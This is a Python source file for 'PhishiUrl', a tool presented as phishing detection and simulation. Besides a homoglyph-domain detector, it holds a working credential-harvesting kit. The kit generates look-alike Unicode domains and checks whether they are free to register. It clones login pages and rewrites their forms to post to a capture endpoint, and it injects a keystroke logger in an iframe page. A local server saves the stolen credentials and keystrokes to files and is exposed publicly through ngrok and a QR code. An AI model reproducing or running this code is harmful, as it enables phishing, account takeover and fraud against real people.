#!/usr/bin/env python3
"""
PhishiUrl - Phishing Detection and Simulation Tool
Author: Emad
Version: 1.3.0
GitHub: github.com/EmadYaY
"""

import click
import json
import os
import sys
import platform
import itertools
import requests
import re
import subprocess
import shutil
import threading
import urllib.parse
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
from io import StringIO

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import print as rprint
from pyngrok import ngrok
from whois import whois
import qrcode
from bs4 import BeautifulSoup

# ──────────────────────────────────────────────
# Platform detection
# ──────────────────────────────────────────────
IS_WINDOWS = platform.system() == "Windows"
IS_LINUX   = platform.system() == "Linux"
IS_MAC     = platform.system() == "Darwin"

console = Console()

# ──────────────────────────────────────────────
# Constants
# ──────────────────────────────────────────────
TOOL_NAME   = "PhishiUrl"
AUTHOR_NAME = "Emad"
VERSION_NUM = "1.3.0"
GITHUB_URL  = "github.com/EmadYaY"

# Unicode homoglyph replacements (deduplicated from v1.2.8)
UNICODE_REPLACEMENTS = [
    {'a': '\u0430'}, {'c': '\u03F2'}, {'e': '\u0435'}, {'o': '\u043E'}, {'p': '\u0440'},
    {'s': '\u0455'}, {'d': '\u0501'}, {'q': '\u051B'}, {'w': '\u051D'},
    {'m': 'rn'},     {'l': '1'},      {'a': 'α'},      {'e': 'е'},      {'o': 'о'},
]

EXTRA_UNICODE_REPLACEMENTS = [
    {'ae': '\u06D5'}, {'waw': '\u0648'}, {'pe': '\u067E'},
    {'gaf': '\u06AF'}, {'dotless_i': '\u0131'},
]

LOGIN_KEYWORDS = [
    'user', 'pass', 'login', 'email', 'password', 'username', 'pwd',
    'signin', 'auth', 'name', 'id', 'account', 'credential', 'key',
    'token', 'access', 'log', 'sign',
]

# ──────────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────────
DEFAULT_CONFIG = {
    'ngrok_token': '',
    'virustotal_api_key': '',
    'phishtank_api_key': '',
    'templates_path': './templates',
}

def _config_path() -> str:
    """Return path to config.json – always relative to the script's directory."""
    here = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(here, '..', 'config.json')

def load_config() -> dict:
    path = _config_path()
    if os.path.exists(path):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
            # Fill in missing keys
            for k, v in DEFAULT_CONFIG.items():
                cfg.setdefault(k, v)
            return cfg
        except json.JSONDecodeError:
            console.print("[red]config.json is malformed – using defaults.[/red]")
    # Write defaults
    with open(path, 'w', encoding='utf-8') as f:
        json.dump(DEFAULT_CONFIG, f, indent=2)
    console.print(f"[green]Created default config: {path}[/green]")
    return dict(DEFAULT_CONFIG)

def save_config(cfg: dict) -> None:
    with open(_config_path(), 'w', encoding='utf-8') as f:
        json.dump(cfg, f, indent=2)
    console.print("[green]Config saved.[/green]")

# ──────────────────────────────────────────────
# Admin / privilege helpers
# ──────────────────────────────────────────────
def is_admin() -> bool:
    """Cross-platform admin check."""
    if IS_WINDOWS:
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    else:
        return os.geteuid() == 0  # type: ignore[attr-defined]

# ──────────────────────────────────────────────
# Hosts file management (cross-platform)
# ──────────────────────────────────────────────
def _hosts_path() -> str:
    if IS_WINDOWS:
        return r'C:\Windows\System32\drivers\etc\hosts'
    return '/etc/hosts'

def modify_hosts_file(homoglyph_domain: str, ip: str = '127.0.0.1') -> bool:
    """Add/update a hosts-file entry. Works on Windows, Linux, and macOS."""
    hosts = _hosts_path()
    entry = f"{ip} {homoglyph_domain}"

    if not is_admin():
        console.print(
            "[red]Admin/root privileges required to modify the hosts file.[/red]\n"
            f"[yellow]Tip: {'Run as Administrator' if IS_WINDOWS else 'Use sudo'}[/yellow]"
        )
        return False

    try:
        backup = hosts + '.bak'
        with open(hosts, 'r', encoding='utf-8', errors='replace') as f:
            lines = f.readlines()

        # Remove old entries for this domain
        lines = [
            l for l in lines
            if homoglyph_domain not in l
        ]
        lines.append(f"{entry}\n")

        with open(hosts, 'w', encoding='utf-8') as f:
            f.writelines(lines)

        # Write backup
        with open(backup, 'w', encoding='utf-8') as f:
            f.writelines(lines)

        console.print(f"[green]Hosts file updated: {entry}[/green]")
        console.print(f"[dim]Backup saved to {backup}[/dim]")
        return True
    except PermissionError:
        console.print("[red]Permission denied while writing hosts file.[/red]")
        return False
    except Exception as e:
        console.print(f"[red]Hosts file error: {e}[/red]")
        return False

# ──────────────────────────────────────────────
# Network helpers
# ──────────────────────────────────────────────
def test_curl(domain: str) -> dict:
    """Run a basic HTTP probe. Uses curl if available, else requests."""
    try:
        result = subprocess.run(
            ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', '--max-time', '5', f'http://{domain}'],
            capture_output=True, text=True, timeout=8,
        )
        code = result.stdout.strip()
        if code and code != '000':
            return {'status': f'HTTP {code}', 'reachable': 'UP'}
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    # Fallback: requests
    try:
        r = requests.get(f'http://{domain}', timeout=5)
        return {'status': f'HTTP {r.status_code}', 'reachable': 'UP'}
    except Exception:
        pass

    return {'status': 'Unreachable', 'reachable': 'DOWN'}

def test_connection(domain: str) -> str:
    """Ping-based reachability check (cross-platform)."""
    flag = '-n' if IS_WINDOWS else '-c'
    try:
        result = subprocess.run(
            ['ping', flag, '1', domain],
            capture_output=True, text=True, timeout=5,
        )
        if result.returncode == 0:
            return "[green]UP[/green]"
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return "[yellow]DOWN[/yellow]"

# ──────────────────────────────────────────────
# External API checks
# ──────────────────────────────────────────────
def check_virustotal(url: str, api_key: str = '') -> dict:
    if not api_key:
        cfg = load_config()
        api_key = cfg.get('virustotal_api_key', '')
    if not api_key:
        return {'error': 'No VirusTotal API key configured'}

    import base64 as _b64
    vt_headers = {'x-apikey': api_key}

    # Ensure URL has scheme for VT
    target = url if url.startswith('http') else f'https://{url}'

    # Step 1: Try GET by URL ID
    url_id = _b64.urlsafe_b64encode(target.encode()).decode().rstrip('=')
    get_endpoint = f'https://www.virustotal.com/api/v3/urls/{url_id}'
    try:
        r = requests.get(get_endpoint, headers=vt_headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
            malicious = stats.get('malicious', 0)
            if malicious > 0:
                return {'status': 'malicious', 'malicious_count': malicious, 'details': stats}
            return {'status': 'clean', 'details': stats}
        elif r.status_code == 401:
            return {'error': 'Invalid VirusTotal API key'}
        elif r.status_code == 429:
            return {'error': 'VirusTotal rate limit exceeded (free tier: 4 req/min)'}
        elif r.status_code in (403, 404):
            # 403 on free tier for direct GET - submit URL first
            post_endpoint = 'https://www.virustotal.com/api/v3/urls'
            pr = requests.post(post_endpoint, headers=vt_headers,
                               data={'url': target}, timeout=10)
            if pr.status_code == 200:
                analysis_id = pr.json().get('data', {}).get('id', '')
                return {
                    'status': 'submitted',
                    'note': 'URL submitted for analysis. Re-run in ~1 minute to get results.',
                    'analysis_id': analysis_id,
                }
            elif pr.status_code == 401:
                return {'error': 'Invalid VirusTotal API key'}
            elif pr.status_code == 429:
                return {'error': 'VirusTotal rate limit exceeded (free tier: 4 req/min)'}
            return {'error': f'VirusTotal submit failed: HTTP {pr.status_code}'}
        return {'error': f'VirusTotal HTTP {r.status_code}'}
    except requests.RequestException as e:
        return {'error': f'Network error: {e}'}

def check_phishtank(url: str, api_key: str = '') -> dict:
    if not api_key:
        cfg = load_config()
        api_key = cfg.get('phishtank_api_key', '')
    if not api_key:
        return {
            'error': 'PhishTank requires an API key (free at phishtank.org). '
                     'Add "phishtank_api_key" to config.json'
        }
    endpoint = 'https://checkurl.phishtank.com/checkurl/'
    payload = {'url': url if url.startswith('http') else f'https://{url}',
               'format': 'json', 'app_key': api_key}
    try:
        r = requests.post(endpoint, data=payload, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get('results', {}).get('in_database', False):
                return {'status': 'malicious', 'details': data['results']}
            return {'status': 'clean'}
        elif r.status_code == 403:
            return {'error': 'PhishTank: invalid or missing API key'}
        return {'error': f'PhishTank HTTP {r.status_code}'}
    except requests.RequestException as e:
        return {'error': f'Network error: {e}'}

# ──────────────────────────────────────────────
# Domain availability
# ──────────────────────────────────────────────
def check_domain_availability(domain: str) -> bool:
    """Return True if domain is AVAILABLE (not registered), False if registered."""
    try:
        data = whois(domain)
        if data and data.registrar:
            return False
        return True
    except Exception:
        return True  # Assume available on error

# ──────────────────────────────────────────────
# Phishing Detection
# ──────────────────────────────────────────────
class PhishingDetector:
    # ASCII chars commonly substituted for letters in phishing domains
    NUMERIC_SUBS = {'0': 'o', '1': 'l', '5': 's', '6': 'b', '9': 'g', '@': 'a'}
    # Multi-char visual substitutions
    MULTI_SUBS   = {'rn': 'm', 'vv': 'w', 'cl': 'd', 'li': 'h'}
    KEYWORDS     = ['login', 'verify', 'account', 'secure', 'update', 'confirm',
                    'signin', 'password', 'banking', 'wallet', 'support']

    # Well-known brands to compare normalised domain against
    KNOWN_BRANDS = [
        'facebook', 'google', 'paypal', 'apple', 'amazon', 'microsoft',
        'netflix', 'instagram', 'twitter', 'linkedin', 'yahoo', 'gmail',
        'outlook', 'dropbox', 'github', 'steam', 'discord', 'twitch',
        'spotify', 'adobe', 'ebay', 'wellsfargo', 'chase', 'citibank',
        'bankofamerica', 'whatsapp', 'telegram', 'tiktok', 'snapchat',
    ]

    def __init__(self):
        self._unicode_replacements = UNICODE_REPLACEMENTS + EXTRA_UNICODE_REPLACEMENTS

    def _normalize(self, label: str) -> str:
        """Normalize a domain label by reversing all known substitutions."""
        d = label.lower()
        # Multi-char first
        for sub, orig in self.MULTI_SUBS.items():
            d = d.replace(sub, orig)
        # Single numeric/ASCII subs
        for sub, orig in self.NUMERIC_SUBS.items():
            d = d.replace(sub, orig)
        # Unicode homoglyphs → ASCII
        for repl in self._unicode_replacements:
            for char, uni in repl.items():
                d = d.replace(uni, char)
        return d

    def detect(self, url: str) -> dict:
        score  = 0
        alerts = []

        m = re.match(r'(?:https?://)?([^/?#]+)', url)
        domain = m.group(1) if m else url
        label  = domain.lower().split('.')[0]  # first label, e.g. "faceb00k"

        # ── 1. Unicode homoglyph check (Cyrillic/Greek/etc.) ─────────────
        unicode_chars = [c for c in domain if ord(c) > 127]
        if unicode_chars:
            score += 60
            details = [f"{c} (U+{ord(c):04X})" for c in unicode_chars]
            alerts.append(f"Unicode homoglyph chars: {', '.join(details)}")

        # ── 2. ASCII numeric substitution check (0→o, 1→l, etc.) ─────────
        found_subs = []
        for sub_char in self.NUMERIC_SUBS:
            if sub_char in label:
                found_subs.append(sub_char)
        for multi in self.MULTI_SUBS:
            if multi in label:
                found_subs.append(multi)

        if found_subs:
            normalized = self._normalize(label)
            if normalized in self.KNOWN_BRANDS:
                # Definite brand impersonation
                score += 70
                alerts.append(
                    f"Brand impersonation: '{label}' → '{normalized}' "
                    f"(substituted: {found_subs})"
                )
            else:
                # Suspicious substitution chars even without brand match
                score += 30
                alerts.append(
                    f"Suspicious character substitution: {found_subs} in '{label}'"
                )

        # ── 3. Multi-char visual substitution in full domain ──────────────
        for multi in self.MULTI_SUBS:
            if multi in domain.lower() and multi not in str(found_subs):
                score += 20
                alerts.append(f"Visual substitution '{multi}' found in domain")

        # ── 4. Suspicious keyword check ───────────────────────────────────
        for kw in self.KEYWORDS:
            if kw in url.lower():
                score += 15
                alerts.append(f"Suspicious keyword: '{kw}'")

        # ── 5. URL length heuristic ───────────────────────────────────────
        if len(url) > 75:
            score += 10
            alerts.append(f"Unusually long URL ({len(url)} chars)")

        # ── WHOIS ────────────────────────────────────
        try:
            available = check_domain_availability(domain)
            alerts.append(f"WHOIS: {'Available (unregistered)' if available else 'Registered'}")
        except Exception:
            alerts.append("WHOIS: lookup failed")

        # ── Reachability ─────────────────────────────
        curl = test_curl(domain)
        alerts.append(f"HTTP probe: {curl['status']}")

        # ── VirusTotal ───────────────────────────────
        cfg = load_config()
        vt = check_virustotal(url, cfg.get('virustotal_api_key', ''))
        if vt.get('status') == 'malicious':
            score += 50
            alerts.append(f"VirusTotal: MALICIOUS ({vt.get('malicious_count', '?')} engines)")
        elif vt.get('error'):
            alerts.append(f"VirusTotal: {vt['error']}")
        else:
            alerts.append(f"VirusTotal: {vt.get('status', 'unknown')}")

        # ── PhishTank ────────────────────────────────
        pt = check_phishtank(url, cfg.get('phishtank_api_key', ''))
        if pt.get('status') == 'malicious':
            score += 50
            alerts.append("PhishTank: MALICIOUS")
        elif pt.get('error'):
            alerts.append(f"PhishTank: {pt['error']}")
        else:
            alerts.append(f"PhishTank: {pt.get('status', 'unknown')}")

        return {
            'url': url,
            'score': min(score, 100),
            'alerts': alerts,
            'is_phishing': score >= 60,
        }

# ──────────────────────────────────────────────
# Homoglyph URL Generation
# ──────────────────────────────────────────────
def generate_homoglyph_suggestions(domain: str, check_availability: bool = False) -> list:
    """Return list of {'domain': str, 'status': str} dicts."""
    base = domain.lower()
    seen = {base}
    results = [{'domain': base, 'status': 'Original'}]

    # Deduplicate replacements by (char→uni_char) pair
    seen_pairs = set()
    all_replacements = []
    for r in UNICODE_REPLACEMENTS + EXTRA_UNICODE_REPLACEMENTS:
        for char, uni_char in r.items():
            pair = (char, uni_char)
            if pair not in seen_pairs:
                seen_pairs.add(pair)
                all_replacements.append({char: uni_char})

    for repl in all_replacements:
        for char, uni_char in repl.items():
            if char in base:
                candidate = base.replace(char, uni_char)
                if candidate not in seen:
                    seen.add(candidate)
                    if check_availability:
                        available = check_domain_availability(candidate)
                        status = 'Available' if available else 'Registered'
                    else:
                        status = 'Unknown'
                    results.append({'domain': candidate, 'status': status})

    return results

def generate_phishing_urls(
    domain: str,
    tld: str,
    check_connection: bool = False,
    output_file: str = '',
    check_availability: bool = False,
) -> list:
    """Generate all homoglyph URL combinations (capped at 500 for usability)."""
    domain = domain.lower()
    all_replacements = UNICODE_REPLACEMENTS + EXTRA_UNICODE_REPLACEMENTS
    matching = [k for r in all_replacements for k in r if k in domain]

    results = []
    LIMIT = 500

    for r in range(1, min(len(matching) + 1, 5)):
        for combo in itertools.combinations(matching, r):
            if len(results) >= LIMIT:
                break
            new_domain = domain
            uni_chars  = []
            for char in combo:
                for repl in all_replacements:
                    if char in repl:
                        new_domain = new_domain.replace(char, repl[char])
                        uni_chars.append(repl[char])
                        break

            full = new_domain + tld
            entry = {
                'original_domain': domain + tld,
                'phishing_url':    full,
                'replaced_chars':  list(combo),
                'unicode_chars':   uni_chars,
            }
            if check_connection:
                entry['connection'] = test_connection(full)
            if check_availability:
                available = check_domain_availability(full)
                entry['availability'] = 'Available' if available else 'Registered'
            results.append(entry)

    _display_phishing_urls(results, output_file)
    return results

def _display_phishing_urls(results: list, output_file: str = '') -> None:
    table = Table(title="Generated Phishing URLs", show_lines=True)
    table.add_column("Original",    style="cyan")
    table.add_column("Phishing URL", style="red")
    table.add_column("Replaced",    style="yellow")
    table.add_column("Availability", justify="center")

    for r in results:
        if 'original_domain' not in r:
            continue
        table.add_row(
            r['original_domain'],
            r['phishing_url'],
            ', '.join(r.get('replaced_chars', [])),
            r.get('availability', 'N/A'),
        )
    console.print(table)

    if output_file:
        with open(output_file, 'a', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
            f.write('\n')

# ──────────────────────────────────────────────
# Website Cloning
# ──────────────────────────────────────────────
def _get_driver():
    """Return a headless Chrome/Chromium driver, or None if unavailable."""
    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.chrome.service import Service

        opts = Options()
        opts.add_argument('--headless')
        opts.add_argument('--no-sandbox')
        opts.add_argument('--disable-dev-shm-usage')
        opts.add_argument('--disable-gpu')
        opts.add_argument('--window-size=1920,1080')

        # Try webdriver-manager first, then system chromedriver
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            svc = Service(ChromeDriverManager().install())
            return webdriver.Chrome(service=svc, options=opts)
        except Exception:
            pass

        # Fallback: system chromedriver
        return webdriver.Chrome(options=opts)
    except Exception as e:
        console.print(f"[yellow]Selenium unavailable ({e}). Falling back to requests-only mode.[/yellow]")
        return None

def clone_website(
    url: str,
    save_name: str,
    use_local: bool = False,
    local_folder: str = '',
    download_js: bool = True,
    download_all: bool = False,
    use_iframe: bool = False,
) -> str:
    """
    Clone a website and instrument it for credential capture.
    Returns the path of the clone directory, or '' on failure.
    """
    cfg      = load_config()
    safe     = re.sub(r'[^\w.-]', '_', save_name)
    clone_dir = os.path.join(cfg['templates_path'], 'cloned', safe)
    os.makedirs(clone_dir, exist_ok=True)

    headers = {
        'User-Agent': (
            'Mozilla/5.0 (X11; Linux x86_64) '
            'AppleWebKit/537.36 (KHTML, like Gecko) '
            'Chrome/120.0.0.0 Safari/537.36'
        )
    }

    # ── iframe mode ──────────────────────────────────────────────────────────
    if use_iframe:
        return _build_iframe_page(url, clone_dir)

    # ── local folder mode ─────────────────────────────────────────────────────
    if use_local:
        return _clone_from_local(local_folder, clone_dir, url)

    # ── URL cloning mode ──────────────────────────────────────────────────────
    console.print(f"[cyan]Fetching: {url}[/cyan]")
    try:
        resp = requests.get(url, headers=headers, timeout=15)
        resp.raise_for_status()
    except requests.RequestException as e:
        console.print(f"[red]Failed to fetch {url}: {e}[/red]")
        return ''

    soup = BeautifulSoup(resp.text, 'html.parser')

    # Download assets
    _download_assets(soup, url, clone_dir, headers, download_js, download_all)

    # Optional: enhance DOM with Selenium
    driver = _get_driver()
    if driver:
        try:
            driver.get(url)
            from selenium.webdriver.support.ui import WebDriverWait
            from selenium.webdriver.support import expected_conditions as EC
            from selenium.webdriver.common.by import By
            try:
                WebDriverWait(driver, 6).until(
                    EC.presence_of_element_located((By.TAG_NAME, 'input'))
                )
            except Exception:
                pass
            soup = BeautifulSoup(driver.page_source, 'html.parser')
            console.print("[green]DOM enriched via Selenium.[/green]")
        except Exception as e:
            console.print(f"[yellow]Selenium DOM enrichment failed: {e}[/yellow]")
        finally:
            try:
                driver.quit()
            except Exception:
                pass

    return _instrument_and_save(soup, url, clone_dir)

def _build_iframe_page(target_url: str, clone_dir: str) -> str:
    """Build an iframe-based phishing page with a keylogger overlay."""
    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Loading...</title>
  <style>
    * {{ margin: 0; padding: 0; box-sizing: border-box; }}
    body {{ overflow: hidden; }}
    #overlay {{
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 9999; opacity: 0;
      pointer-events: none;
    }}
    iframe {{
      width: 100vw; height: 100vh; border: none;
    }}
  </style>
</head>
<body>
  <div id="overlay"></div>
  <iframe src="{target_url}" id="target-frame" sandbox="allow-same-origin allow-scripts allow-forms"></iframe>
  <script>
  (function() {{
    var log = [];
    var lastSave = Date.now();

    document.addEventListener('keydown', function(e) {{
      log.push({{t: Date.now(), k: e.key}});
      if (Date.now() - lastSave > 5000) {{
        sendLog();
        lastSave = Date.now();
      }}
    }});

    // Intercept form posts from iframe (same-origin only)
    window.addEventListener('message', function(e) {{
      if (e.data && e.data.type === 'FORM_DATA') {{
        fetch('/capture', {{
          method: 'POST',
          headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
          body: new URLSearchParams(e.data.payload).toString()
        }});
      }}
    }});

    function sendLog() {{
      if (!log.length) return;
      fetch('/keylog', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify(log)
      }});
      log = [];
    }}

    window.addEventListener('beforeunload', sendLog);
  }})();
  </script>
</body>
</html>"""
    path = os.path.join(clone_dir, 'index.html')
    with open(path, 'w', encoding='utf-8') as f:
        f.write(html)
    console.print(f"[green]Iframe page saved to {path}[/green]")
    return clone_dir

def _clone_from_local(local_folder: str, clone_dir: str, original_url: str) -> str:
    if not os.path.isdir(local_folder):
        console.print(f"[red]Local folder not found: {local_folder}[/red]")
        return ''
    index = os.path.join(local_folder, 'index.html')
    if not os.path.isfile(index):
        console.print(f"[red]index.html not found in {local_folder}[/red]")
        return ''

    # Copy all files
    for item in os.listdir(local_folder):
        src = os.path.join(local_folder, item)
        dst = os.path.join(clone_dir, item)
        if os.path.isfile(src):
            shutil.copy2(src, dst)
        elif os.path.isdir(src):
            shutil.copytree(src, dst, dirs_exist_ok=True)

    with open(index, 'r', encoding='utf-8', errors='replace') as f:
        soup = BeautifulSoup(f, 'html.parser')

    return _instrument_and_save(soup, original_url or '', clone_dir)

def _download_assets(
    soup: BeautifulSoup,
    base_url: str,
    clone_dir: str,
    headers: dict,
    download_js: bool,
    download_all: bool,
) -> None:
    """Download referenced assets and rewrite their URLs to local paths."""
    tasks = []

    for tag in soup.find_all('link', href=True):
        tasks.append(('href', tag, urllib.parse.urljoin(base_url, tag['href'])))

    if download_js:
        for tag in soup.find_all('script', src=True):
            tasks.append(('src', tag, urllib.parse.urljoin(base_url, tag['src'])))

    if download_all:
        for tag in soup.find_all('img', src=True):
            tasks.append(('src', tag, urllib.parse.urljoin(base_url, tag['src'])))
        for tag in soup.find_all(['source', 'video', 'audio'], src=True):
            tasks.append(('src', tag, urllib.parse.urljoin(base_url, tag['src'])))
    else:
        # At minimum, grab logo images
        for tag in soup.find_all('img', src=True):
            src_val = tag.get('src', '')
            classes = ' '.join(tag.get('class', []))
            if 'logo' in src_val.lower() or 'logo' in classes.lower():
                tasks.append(('src', tag, urllib.parse.urljoin(base_url, src_val)))

    # Deduplicate tasks by URL
    seen_urls = set()
    deduped = []
    for item in tasks:
        if item[2] not in seen_urls:
            seen_urls.add(item[2])
            deduped.append(item)
    tasks = deduped

    for attr, tag, asset_url in tasks:
        try:
            parsed = urllib.parse.urlparse(asset_url)
            # Preserve subdirectory path (e.g. /assets/foo.js → assets/foo.js)
            rel_path = parsed.path.lstrip('/')
            if not rel_path or rel_path.endswith('/'):
                rel_path = f'asset_{abs(hash(asset_url))}.bin'
            if not os.path.splitext(rel_path)[1]:
                rel_path += '.bin'

            local_path = os.path.join(clone_dir, rel_path)
            os.makedirs(os.path.dirname(local_path), exist_ok=True)

            r = requests.get(asset_url, headers=headers, timeout=8)
            r.raise_for_status()
            with open(local_path, 'wb') as f:
                f.write(r.content)
            # Point tag to relative path (use forward slashes for HTML)
            tag[attr] = rel_path.replace(os.sep, '/')
            console.print(f"[dim]Downloaded: {rel_path}[/dim]")
        except Exception as e:
            console.print(f"[dim]Asset skip ({asset_url.split('/')[-1]}): {e}[/dim]")

def _instrument_and_save(soup: BeautifulSoup, original_url: str, clone_dir: str) -> str:
    """Inject credential-capture JS/form modifications and save index.html."""
    inputs = soup.find_all('input')
    if not inputs:
        console.print("[yellow]No <input> elements found – page saved without capture logic.[/yellow]")
        _write_html(soup, clone_dir)
        return clone_dir

    # Ensure every input has a name
    for idx, inp in enumerate(inputs):
        if not inp.get('name'):
            inp['name'] = f'field_{idx}'

    forms = soup.find_all('form')
    if forms:
        for form in forms:
            original_action = form.get('action', '')
            if original_action and not original_action.startswith('http'):
                original_action = urllib.parse.urljoin(original_url, original_action)
            form['method'] = 'POST'
            form['action'] = '/capture'
            # Store original action – use attrs= to avoid BS4 'name' kwarg clash
            hidden = soup.new_tag('input')
            hidden.attrs = {'type': 'hidden', 'name': 'original_action',
                            'value': original_action or original_url}
            form.insert(0, hidden)
            # Ensure submit button
            if not form.find(lambda t: t.name in ('button', 'input') and t.get('type') == 'submit'):
                btn = soup.new_tag('button')
                btn['type'] = 'submit'
                btn['style'] = 'display:none'
                form.append(btn)
    else:
        # Wrap orphan inputs in a synthetic form
        new_form = soup.new_tag('form')
        new_form['method'] = 'POST'
        new_form['action'] = '/capture'
        hidden = soup.new_tag('input')
        hidden.attrs = {'type': 'hidden', 'name': 'original_action', 'value': original_url}
        new_form.append(hidden)
        first = inputs[0]
        parent = first.parent
        parent.insert(list(parent.children).index(first), new_form)
        for inp in inputs:
            inp.extract()
            new_form.append(inp)

    # Inject capture script
    capture_js = soup.new_tag('script')
    capture_js.string = r"""
(function() {
  document.querySelectorAll('form').forEach(function(form) {
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      var fd = new FormData(form);
      fetch('/capture', { method: 'POST', body: fd })
        .then(function() {
          var orig = form.querySelector('input[name="original_action"]');
          if (orig && orig.value) window.location.href = orig.value;
        })
        .catch(console.error);
    });
  });
})();
"""
    body = soup.find('body') or soup
    body.append(capture_js)

    _write_html(soup, clone_dir)
    return clone_dir

def _write_html(soup: BeautifulSoup, clone_dir: str) -> None:
    path = os.path.join(clone_dir, 'index.html')
    with open(path, 'w', encoding='utf-8') as f:
        f.write(str(soup))
    console.print(f"[green]Cloned page saved → {path}[/green]")

# ──────────────────────────────────────────────
# HTTP Server
# ──────────────────────────────────────────────
class PhishingHandler(SimpleHTTPRequestHandler):
    def __init__(self, *args, template='index.html',
                 local_address='', ngrok_address='', **kwargs):
        self.template       = template
        self.local_address  = local_address
        self.ngrok_address  = ngrok_address
        super().__init__(*args, **kwargs)

    def log_message(self, fmt, *args):
        # Suppress default access log noise; use rich instead
        console.print(f"[dim]{self.address_string()} – {fmt % args}[/dim]")

    def do_GET(self):
        if self.path == '/':
            self.send_response(302)
            self.send_header('Location', f'/{self.template}')
            self.end_headers()
        else:
            super().do_GET()

    def do_POST(self):
        length   = int(self.headers.get('Content-Length', 0))
        raw      = self.rfile.read(length).decode('utf-8', errors='replace')
        params   = {k: v[0] for k, v in urllib.parse.parse_qs(raw).items()}
        ts       = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        if self.path == '/capture':
            self._save_credentials(params, ts)
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'ok')

        elif self.path == '/keylog':
            self._save_keylog(raw, ts)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'ok')

        else:
            self.send_response(404)
            self.end_headers()

    def _save_credentials(self, params: dict, ts: str) -> None:
        creds_file = 'credentials.txt'
        addrs = []
        if self.local_address:
            addrs.append(f'Local: {self.local_address}')
        if self.ngrok_address:
            addrs.append(f'Ngrok: {self.ngrok_address}')

        with open(creds_file, 'a', encoding='utf-8') as f:
            f.write(f"\n[{ts}] {' | '.join(addrs)}\n")
            for k, v in params.items():
                if k != 'original_action':
                    f.write(f"  {k}: {v}\n")

        console.print(f"[bold green]✓ Credentials captured → {creds_file}[/bold green]")
        for k, v in params.items():
            if k != 'original_action' and any(kw in k.lower() for kw in LOGIN_KEYWORDS):
                console.print(f"  [yellow]{k}[/yellow]: {v}")

    def _save_keylog(self, raw: str, ts: str) -> None:
        try:
            entries = json.loads(raw)
            keys = ''.join(e.get('k', '') for e in entries)
        except Exception:
            keys = raw
        with open('keylog.txt', 'a', encoding='utf-8') as f:
            f.write(f"[{ts}] {keys}\n")
        console.print(f"[dim]Keylog entry saved ({len(keys)} chars)[/dim]")


def start_web_server(
    port: int,
    clone_dir: str = '',
    template: str = 'index.html',
    local_address: str = '',
    ngrok_address: str = '',
) -> None:
    serve_dir = clone_dir if clone_dir else load_config()['templates_path']
    os.chdir(serve_dir)

    handler = lambda *a, **kw: PhishingHandler(
        *a, template=template,
        local_address=local_address,
        ngrok_address=ngrok_address,
        **kw,
    )
    srv = HTTPServer(('', port), handler)
    console.print(Panel(
        f"[green]Server running on port {port}[/green]\n"
        f"Local:  http://localhost:{port}\n"
        + (f"Ngrok:  {ngrok_address}" if ngrok_address else ""),
        title="PhishiUrl Server",
    ))
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        console.print("\n[yellow]Server stopped.[/yellow]")

# ──────────────────────────────────────────────
# Ngrok
# ──────────────────────────────────────────────
def start_ngrok(port: int) -> str:
    cfg = load_config()
    token = cfg.get('ngrok_token', '')
    if not token:
        token = click.prompt("Ngrok auth token", hide_input=True)
        cfg['ngrok_token'] = token
        save_config(cfg)

    ngrok.set_auth_token(token)
    try:
        tunnel = ngrok.connect(port)
        url    = tunnel.public_url
        console.print(f"[green]Ngrok tunnel: {url}[/green]")
        _print_qr(url)
        return url
    except Exception as e:
        console.print(f"[red]Ngrok error: {e}[/red]")
        return ''

def _print_qr(url: str) -> None:
    qr = qrcode.QRCode(border=1)
    qr.add_data(url)
    f = StringIO()
    qr.print_ascii(out=f)
    console.print(Panel(f.getvalue(), title="QR Code"))

# ──────────────────────────────────────────────
# Reporting
# ──────────────────────────────────────────────
def generate_report(results: list) -> None:
    table = Table(title="Phishing Analysis Results", show_lines=True)
    table.add_column("URL",        style="cyan", max_width=50)
    table.add_column("Score",      justify="center")
    table.add_column("Verdict",    justify="center")
    table.add_column("Top Alert",  style="yellow")

    for r in results:
        score   = r['score']
        verdict = "[red]PHISHING[/red]" if r['is_phishing'] else "[green]SAFE[/green]"
        top     = r['alerts'][0] if r['alerts'] else '—'
        table.add_row(r['url'], str(score), verdict, top)

    console.print(table)

    report = {
        'generated': datetime.now().isoformat(),
        'tool': f'{TOOL_NAME} {VERSION_NUM}',
        'results': results,
    }
    with open('report.json', 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    console.print("[green]Full report → report.json[/green]")

# ──────────────────────────────────────────────
# Banner
# ──────────────────────────────────────────────
BANNER = r"""
██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗██╗   ██╗██████╗ ██╗      ██╗██████╗ ███╗
██╔══██╗██║  ██║██║██╔════╝██║  ██║██║██║   ██║██╔══██╗██║      ██║██╔══██╗████╗
██████╔╝███████║██║███████╗███████║██║██║   ██║██████╔╝██║      ██║██║  ██║██╔██╗
██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║   ██║██╔══██╗██║      ██║██║  ██║██║╚██╗
